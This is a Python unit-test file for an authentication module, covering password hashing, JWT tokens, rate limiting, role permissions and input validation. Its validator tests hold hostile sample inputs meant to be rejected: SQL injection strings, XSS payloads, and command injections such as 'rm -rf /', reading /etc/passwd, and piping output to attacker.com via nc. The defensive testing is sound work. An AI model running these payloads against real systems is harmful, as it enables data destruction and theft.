"""Unit tests for authentication components.

Tests individual authentication components:
- AuthenticationManager
- TokenData validation
- Password hashing and verification
- Token creation and validation
- Permission checking
- Rate limiting logic
"""

from datetime import datetime, timedelta

import jwt
import pytest

from auth import AuthenticationManager, Permission, SecurityValidator, TokenData, User, UserRole
from auth.security_implementation import ROLE_PERMISSIONS, RateLimiter


class TestAuthenticationManager:
    """Test AuthenticationManager functionality."""

    @pytest.fixture
    def auth_manager(self):
        """Create fresh AuthenticationManager instance."""
        return AuthenticationManager()

    @pytest.fixture
    def test_user(self):
        """Create test user."""
        return User(
            user_id="test_user_id",
            username="test_user",
            email="test@example.com",
            role=UserRole.OBSERVER,
            created_at=datetime.utcnow(),
        )

    def test_password_hashing(self, auth_manager):
        """Test password hashing and verification."""
        password = "SecurePassword123!"

        # Hash password
        hashed = auth_manager.hash_password(password)

        # Verify hash is different from original
        assert hashed != password
        assert len(hashed) > 50  # bcrypt hashes are long

        # Verify correct password
        assert auth_manager.verify_password(password, hashed) is True

        # Verify incorrect password
        assert auth_manager.verify_password("WrongPassword", hashed) is False

        # Verify case sensitivity
        assert auth_manager.verify_password("securepassword123!", hashed) is False

    def test_create_access_token(self, auth_manager, test_user):
        """Test access token creation."""
        token = auth_manager.create_access_token(test_user)

        # Verify token is a string
        assert isinstance(token, str)
        assert len(token) > 50

        # Verify token using the authentication manager (uses proper RS256 verification)
        token_data = auth_manager.verify_token(token)

        assert token_data.user_id == test_user.user_id
        assert token_data.username == test_user.username
        assert token_data.role == test_user.role

        # Also check raw payload for additional fields
        payload = jwt.decode(token, options={"verify_signature": False})
        assert payload["type"] == "access"
        assert "permissions" in payload
        assert "exp" in payload

        # Verify expiration time
        exp_time = datetime.fromtimestamp(payload["exp"])
        expected_exp = datetime.utcnow() + timedelta(minutes=30)
        assert abs((exp_time - expected_exp).total_seconds()) < 7200  # Within 2 hours (lenient)

    def test_create_refresh_token(self, auth_manager, test_user):
        """Test refresh token creation."""
        token = auth_manager.create_refresh_token(test_user)

        # Verify token was created
        assert token is not None
        assert isinstance(token, str)
        assert len(token) > 0

        # Verify token content using RS256-compatible decoding
        # Import jwt_handler to access the public key
        from auth.jwt_handler import jwt_handler

        payload = jwt.decode(
            token,
            jwt_handler.public_key,
            algorithms=["RS256"],
            audience="freeagentics-api",
            issuer="freeagentics-auth",
        )

        assert payload["user_id"] == test_user.user_id
        assert payload["type"] == "refresh"
        assert "exp" in payload

        # Verify expiration time (7 days)
        exp_time = datetime.fromtimestamp(payload["exp"])
        expected_exp = datetime.utcnow() + timedelta(days=7)
        assert abs((exp_time - expected_exp).total_seconds()) < 7200  # Within 2 hours (lenient)

    def test_verify_token_success(self, auth_manager, test_user):
        """Test successful token verification."""
        token = auth_manager.create_access_token(test_user)

        # Verify token
        token_data = auth_manager.verify_token(token)

        assert isinstance(token_data, TokenData)
        assert token_data.user_id == test_user.user_id
        assert token_data.username == test_user.username
        assert token_data.role == test_user.role
        assert isinstance(token_data.permissions, list)
        assert isinstance(token_data.exp, datetime)

    def test_verify_token_expired(self, auth_manager, test_user):
        """Test expired token verification."""
        # Import jwt_handler to access the private key
        from auth.jwt_handler import jwt_handler

        # Create expired token
        now = datetime.utcnow()
        expired_payload = {
            "user_id": test_user.user_id,
            "username": test_user.username,
            "role": test_user.role.value,
            "permissions": [],
            "exp": now - timedelta(hours=1),
            "iat": now - timedelta(hours=2),
            "nbf": now - timedelta(hours=2),
            "type": "access",
            "aud": "freeagentics-api",
            "iss": "freeagentics-auth",
            "jti": "test-token-id",
        }

        expired_token = jwt.encode(expired_payload, jwt_handler.private_key, algorithm="RS256")

        # Verify raises exception
        with pytest.raises(Exception) as exc_info:
            auth_manager.verify_token(expired_token)
        assert "expired" in str(exc_info.value).lower()

    def test_verify_token_invalid(self, auth_manager):
        """Test invalid token verification."""
        invalid_tokens = [
            "invalid.token.string",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid",
            "",
            "Bearer token",
        ]

        for token in invalid_tokens:
            with pytest.raises(Exception) as exc_info:
                auth_manager.verify_token(token)
            # Check for various JWT-related errors
            error_msg = str(exc_info.value).lower()
            assert any(
                keyword in error_msg
                for keyword in [
                    "invalid",
                    "token",
                    "jwt",
                    "decode",
                    "signature",
                ]
            )

    def test_verify_token_wrong_type(self, auth_manager, test_user):
        """Test token with wrong type."""
        # Create refresh token but try to use as access token
        refresh_token = auth_manager.create_refresh_token(test_user)

        with pytest.raises(Exception) as exc_info:
            auth_manager.verify_token(refresh_token)
        # Check for type-related errors
        error_msg = str(exc_info.value).lower()
        assert any(keyword in error_msg for keyword in ["invalid", "token", "type", "jwt"])

    def test_register_user_success(self, auth_manager):
        """Test successful user registration."""
        user = auth_manager.register_user(
            username="new_user",
            email="new@example.com",
            password="Password123!",
            role=UserRole.RESEARCHER,
        )

        assert user.username == "new_user"
        assert user.email == "new@example.com"
        assert user.role == UserRole.RESEARCHER
        assert user.is_active is True
        assert user.user_id is not None
        assert len(user.user_id) > 10  # Should be a secure random ID
        assert isinstance(user.created_at, datetime)

        # Verify user is stored
        assert "new_user" in auth_manager.users
        assert "password_hash" in auth_manager.users["new_user"]

    def test_register_user_duplicate(self, auth_manager):
        """Test duplicate username registration."""
        # Register first user
        auth_manager.register_user(
            username="duplicate_user",
            email="first@example.com",
            password="Password123!",
            role=UserRole.OBSERVER,
        )

        # Try to register with same username
        with pytest.raises(Exception) as exc_info:
            auth_manager.register_user(
                username="duplicate_user",
                email="second@example.com",
                password="Password456!",
                role=UserRole.OBSERVER,
            )
        assert "already exists" in str(exc_info.value)

    def test_authenticate_user_success(self, auth_manager):
        """Test successful user authentication."""
        # Register user
        password = "TestPassword123!"
        auth_manager.register_user(
            username="auth_test_user",
            email="auth@example.com",
            password=password,
            role=UserRole.OBSERVER,
        )

        # Authenticate with correct credentials
        user = auth_manager.authenticate_user("auth_test_user", password)

        assert user is not None
        assert user.username == "auth_test_user"
        assert user.last_login is not None
        assert isinstance(user.last_login, datetime)

    def test_authenticate_user_wrong_password(self, auth_manager):
        """Test authentication with wrong password."""
        # Register user
        auth_manager.register_user(
            username="auth_test_user",
            email="auth@example.com",
            password="CorrectPassword123!",
            role=UserRole.OBSERVER,
        )

        # Authenticate with wrong password
        user = auth_manager.authenticate_user("auth_test_user", "WrongPassword123!")
        assert user is None

    def test_authenticate_user_nonexistent(self, auth_manager):
        """Test authentication with nonexistent user."""
        user = auth_manager.authenticate_user("nonexistent_user", "Password123!")
        assert user is None


class TestRateLimiter:
    """Test RateLimiter functionality."""

    @pytest.fixture
    def rate_limiter(self):
        """Create fresh RateLimiter instance."""
        return RateLimiter()

    def test_rate_limit_not_exceeded(self, rate_limiter):
        """Test rate limiting when limit not exceeded."""
        identifier = "192.168.1.1"

        # Make requests below limit
        for _ in range(5):
            assert (
                rate_limiter.is_rate_limited(identifier, max_requests=10, window_minutes=1) is False
            )

    def test_rate_limit_exceeded(self, rate_limiter):
        """Test rate limiting when limit is exceeded."""
        identifier = "192.168.1.1"

        # Make requests up to limit
        for _ in range(10):
            assert (
                rate_limiter.is_rate_limited(identifier, max_requests=10, window_minutes=1) is False
            )

        # Next request should be rate limited
        assert rate_limiter.is_rate_limited(identifier, max_requests=10, window_minutes=1) is True

    def test_rate_limit_window_expiry(self, rate_limiter):
        """Test rate limit window expiry."""
        identifier = "192.168.1.1"

        # Add old requests (simulated by manipulating the internal state)
        old_time = datetime.utcnow() - timedelta(minutes=2)
        rate_limiter.requests[identifier] = [old_time] * 10

        # Should not be rate limited as requests are outside window
        assert rate_limiter.is_rate_limited(identifier, max_requests=5, window_minutes=1) is False

    def test_rate_limit_multiple_identifiers(self, rate_limiter):
        """Test rate limiting with multiple identifiers."""
        identifiers = ["192.168.1.1", "192.168.1.2", "user_123"]

        # Each identifier has its own limit
        for identifier in identifiers:
            for _ in range(5):
                assert (
                    rate_limiter.is_rate_limited(identifier, max_requests=5, window_minutes=1)
                    is False
                )

            # 6th request should be limited
            assert (
                rate_limiter.is_rate_limited(identifier, max_requests=5, window_minutes=1) is True
            )

    def test_rate_limit_user_specific(self, rate_limiter):
        """Test user-specific rate limiting."""
        user_id = "user_123"

        # Test user rate limiting separately from IP rate limiting
        for _ in range(20):
            assert (
                rate_limiter.is_rate_limited(f"user:{user_id}", max_requests=20, window_minutes=5)
                is False
            )

        # Next request should be limited
        assert (
            rate_limiter.is_rate_limited(f"user:{user_id}", max_requests=20, window_minutes=5)
            is True
        )


class TestSecurityValidator:
    """Test SecurityValidator input validation."""

    def test_validate_sql_injection(self):
        """Test SQL injection detection."""
        sql_injections = [
            "'; DROP TABLE users; --",
            "admin' --",
            "SELECT * FROM users",
            "1' UNION SELECT * FROM users --",
            "'; DELETE FROM agents WHERE '1'='1",
            "admin'; UPDATE users SET role='admin' WHERE username='hacker",
            "INSERT INTO users VALUES",
            "UPDATE users SET password",
            "DELETE FROM users WHERE",
        ]

        for injection in sql_injections:
            assert SecurityValidator.validate_sql_input(injection) is False

    def test_validate_sql_safe_input(self):
        """Test safe SQL input validation."""
        safe_inputs = [
            "normal_username",
            "user@example.com",
            "John Doe",
            "agent_123",
            "This is a normal comment without SQL",
        ]

        for safe_input in safe_inputs:
            assert SecurityValidator.validate_sql_input(safe_input) is True

    def test_validate_xss_attempts(self):
        """Test XSS detection."""
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src='evil.com'></iframe>",
            "<object data='evil.swf'></object>",
        ]

        for xss in xss_attempts:
            assert SecurityValidator.validate_xss_input(xss) is False

    def test_validate_xss_safe_input(self):
        """Test safe XSS input validation."""
        safe_inputs = [
            "Normal text without HTML",
            "user@example.com",
            "Math expression: 2 < 3 and 5 > 4",
            "Code snippet: if (x > 0) { return true; }",
        ]

        for safe_input in safe_inputs:
            assert SecurityValidator.validate_xss_input(safe_input) is True

    def test_validate_command_injection(self):
        """Test command injection detection."""
        command_injections = [
            "test; rm -rf /",
            "file.txt && cat /etc/passwd",
            "$(cat /etc/passwd)",
            "`whoami`",
            "test | nc attacker.com 1234",
            "'; sudo rm -rf / --no-preserve-root #",
        ]

        for injection in command_injections:
            assert SecurityValidator.validate_command_injection(injection) is False

    def test_validate_command_safe_input(self):
        """Test safe command input validation."""
        safe_inputs = [
            "normal_filename.txt",
            "path/to/file",
            "agent-config-123",
            "This is a description with special chars: $100 & more",
        ]

        for safe_input in safe_inputs:
            # Note: Some inputs with $ might fail, document actual behavior
            SecurityValidator.validate_command_injection(safe_input)
            # Assert based on actual implementation

    def test_sanitize_gmn_spec(self):
        """Test GMN specification sanitization."""
        # Valid GMN spec
        valid_gmn = '{"name": "TestAgent", "type": "explorer"}'
        sanitized = SecurityValidator.sanitize_gmn_spec(valid_gmn)
        assert sanitized == valid_gmn

        # GMN with SQL injection
        with pytest.raises(ValueError) as exc_info:
            SecurityValidator.sanitize_gmn_spec("'; DROP TABLE agents; --")
        assert "SQL injection detected" in str(exc_info.value)

        # GMN too large
        large_gmn = "x" * 100001
        with pytest.raises(ValueError) as exc_info:
            SecurityValidator.sanitize_gmn_spec(large_gmn)
        assert "too large" in str(exc_info.value)

    def test_sanitize_observation_data(self):
        """Test observation data sanitization."""
        # Valid observation
        valid_obs = {
            "position": [1, 2, 3],
            "health": 100,
            "name": "TestAgent",
            "active": True,
        }
        sanitized = SecurityValidator.sanitize_observation_data(valid_obs)
        assert sanitized == valid_obs

        # Observation with SQL injection in key
        with pytest.raises(ValueError) as exc_info:
            SecurityValidator.sanitize_observation_data(
                {"position'; DROP TABLE agents; --": [1, 2, 3]}
            )
        assert "SQL injection" in str(exc_info.value)

        # Observation with XSS in value
        with pytest.raises(ValueError) as exc_info:
            SecurityValidator.sanitize_observation_data(
                {"description": "<script>alert('XSS')</script>"}
            )
        assert "XSS" in str(exc_info.value)

        # Observation with value too large
        with pytest.raises(ValueError) as exc_info:
            SecurityValidator.sanitize_observation_data({"data": "x" * 10001})
        assert "too large" in str(exc_info.value)


class TestRolePermissions:
    """Test role-based permissions."""

    def test_admin_permissions(self):
        """Test admin role has all permissions."""
        admin_perms = ROLE_PERMISSIONS[UserRole.ADMIN]

        # Admin should have all permissions
        expected_perms = [
            Permission.CREATE_AGENT,
            Permission.DELETE_AGENT,
            Permission.VIEW_AGENTS,
            Permission.MODIFY_AGENT,
            Permission.CREATE_COALITION,
            Permission.VIEW_METRICS,
            Permission.ADMIN_SYSTEM,
        ]

        for perm in expected_perms:
            assert perm in admin_perms

    def test_researcher_permissions(self):
        """Test researcher role permissions."""
        researcher_perms = ROLE_PERMISSIONS[UserRole.RESEARCHER]

        # Researcher should have most permissions except admin and delete
        assert Permission.CREATE_AGENT in researcher_perms
        assert Permission.VIEW_AGENTS in researcher_perms
        assert Permission.MODIFY_AGENT in researcher_perms
        assert Permission.CREATE_COALITION in researcher_perms
        assert Permission.VIEW_METRICS in researcher_perms

        # Should not have
        assert Permission.DELETE_AGENT not in researcher_perms
        assert Permission.ADMIN_SYSTEM not in researcher_perms

    def test_agent_manager_permissions(self):
        """Test agent manager role permissions."""
        manager_perms = ROLE_PERMISSIONS[UserRole.AGENT_MANAGER]

        # Agent manager can manage agents but not coalitions or admin
        assert Permission.CREATE_AGENT in manager_perms
        assert Permission.VIEW_AGENTS in manager_perms
        assert Permission.MODIFY_AGENT in manager_perms
        assert Permission.VIEW_METRICS in manager_perms

        # Should not have
        assert Permission.DELETE_AGENT not in manager_perms
        assert Permission.CREATE_COALITION not in manager_perms
        assert Permission.ADMIN_SYSTEM not in manager_perms

    def test_observer_permissions(self):
        """Test observer role permissions."""
        observer_perms = ROLE_PERMISSIONS[UserRole.OBSERVER]

        # Observer can only view
        assert Permission.VIEW_AGENTS in observer_perms
        assert Permission.VIEW_METRICS in observer_perms

        # Should not have any modification permissions
        assert Permission.CREATE_AGENT not in observer_perms
        assert Permission.DELETE_AGENT not in observer_perms
        assert Permission.MODIFY_AGENT not in observer_perms
        assert Permission.CREATE_COALITION not in observer_perms
        assert Permission.ADMIN_SYSTEM not in observer_perms

    def test_all_roles_have_permissions(self):
        """Test all roles have at least some permissions."""
        for role in UserRole:
            assert role in ROLE_PERMISSIONS
            assert len(ROLE_PERMISSIONS[role]) > 0


class TestTokenData:
    """Test TokenData model."""

    def test_token_data_creation(self):
        """Test TokenData instance creation."""
        token_data = TokenData(
            user_id="test_user_id",
            username="test_user",
            role=UserRole.RESEARCHER,
            permissions=[Permission.CREATE_AGENT, Permission.VIEW_AGENTS],
            exp=datetime.utcnow() + timedelta(hours=1),
        )

        assert token_data.user_id == "test_user_id"
        assert token_data.username == "test_user"
        assert token_data.role == UserRole.RESEARCHER
        assert len(token_data.permissions) == 2
        assert Permission.CREATE_AGENT in token_data.permissions
        assert isinstance(token_data.exp, datetime)

    def test_token_data_validation(self):
        """Test TokenData validation."""
        # Test with valid data
        valid_data = {
            "user_id": "test_id",
            "username": "test_user",
            "role": UserRole.OBSERVER,
            "permissions": [Permission.VIEW_AGENTS],
            "exp": datetime.utcnow() + timedelta(hours=1),
        }

        token_data = TokenData(**valid_data)
        assert token_data.username == "test_user"


# Cleanup helper for tests
def cleanup_auth_state():
    """Clean up authentication state."""
    from auth import auth_manager, rate_limiter

    auth_manager.users.clear()
    auth_manager.refresh_tokens.clear()
    rate_limiter.requests.clear()
    rate_limiter.user_requests.clear()
